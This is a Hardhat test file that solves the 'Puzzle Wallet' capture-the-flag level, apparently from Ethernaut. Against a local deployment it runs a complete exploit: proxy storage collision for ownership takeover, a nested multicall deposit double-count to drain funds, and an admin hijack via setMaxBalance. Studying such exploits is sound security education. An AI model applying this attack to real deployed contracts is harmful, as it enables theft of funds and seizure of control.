import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 24 - Puzzle wallet contract hack", () => {
    async function setUp() {
        const [owner, admin, hacker] = await ethers.getSigners();

        const PuzzleProxyContract = await ethers.getContractFactory("PuzzleProxy");
        const PuzzleImplementationContract = await ethers.getContractFactory("PuzzleWallet");
        
        const implementation = await PuzzleImplementationContract.deploy();
        
        let iface = new ethers.Interface(
            ["function init(uint256)", 
            "function addToWhitelist(address)",
            "function balances(address)",
            "function deposit()", 
            "function execute(address,uint256,bytes)",
            "function multicall(bytes[])",
            "function setMaxBalance(uint256)",
            "function whitelisted(address)",
        ]);

        // In this case, we establish the init data to set the max balance at 5 eth.
        const initEncodedData = iface.encodeFunctionData("init", [ethers.parseEther("5")]);
        console.log("Init encoded data:", initEncodedData);

        const proxy = await PuzzleProxyContract.deploy(admin.address, await implementation.getAddress(), initEncodedData);

        // By attaching the proxy to its implementation, ...
        const proxyAttached = implementation.attach(await proxy.getAddress());
        
        await proxyAttached.connect(owner).addToWhitelist(owner.address);
        await proxyAttached.connect(owner).deposit({value: ethers.parseEther("0.2")});

        return {owner, admin, hacker, iface, implementation, proxy, proxyAttached};
    };
    
    describe("When hacking", () => {
        it("Check hack", async() => {
            /*
             * This is an accurate example of storage collision in the context of upgradeable contracts.
             * The PuzzleWallet implementation owner variable matches the proxy pendingAdmin slot when modifying through a delegatecall.
             * The same happens between maxBalance and admin.
             * 
             * The hacker can call proposeNewAdmin(), which in turn gives ownership when executing delegating to a privileged function from the implementation.
             * Then, in order to bypass the single Deposit call restriction, the hacker can pass two data pieces through multicall:
             * * The first data argument calls for the deposit method.
             * * The second one calls for the multicall method itself, which internally calls for the deposit method.
             * 
             * That way, the check is bypassed and the hacker can withdraw twice as much as he has deposited.
             * 
             * Lesson: be aware of storage collision!
            **/
            const {owner, admin, hacker, iface, implementation, proxy, proxyAttached} = await loadFixture(setUp);

            // The hacker hijacks the proxy.
            expect(await proxy.pendingAdmin()).to.equal(owner.address);

            await proxy.connect(hacker).proposeNewAdmin(hacker.address);
            expect(await proxy.pendingAdmin()).to.equal(hacker.address);

            // Then he adds himself to the whitelist.
            await proxyAttached.connect(hacker).addToWhitelist(hacker.address);

            // Then he calls the multicall method once for executing two operations: deposit + call to multicall for deposit.
            const depositEncodedData = iface.encodeFunctionData("deposit", []);
            const multicallEncodedData = iface.encodeFunctionData("multicall", [[depositEncodedData]]);
            
            const multicallInput = [depositEncodedData, multicallEncodedData];
            console.log("Multicall input:", multicallInput);

            await proxyAttached.connect(hacker).multicall(multicallInput, {value: ethers.parseEther("0.2")});
            
            // Then he can withdraw twice as much as what he deposited.
            expect(await proxyAttached.balances(hacker.address)).to.equal(ethers.parseEther("0.4"));

            await proxyAttached.connect(hacker).execute(hacker.address, ethers.parseEther("0.4"), "0x");

            // Then he can set the max balance to his own address!
            await proxyAttached.connect(hacker).setMaxBalance(hacker.address);

            expect(await proxy.admin()).to.equal(hacker.address);
        });

        // To be done: execute everything using the interface calls, instead of the proxyAttached object.
    });
});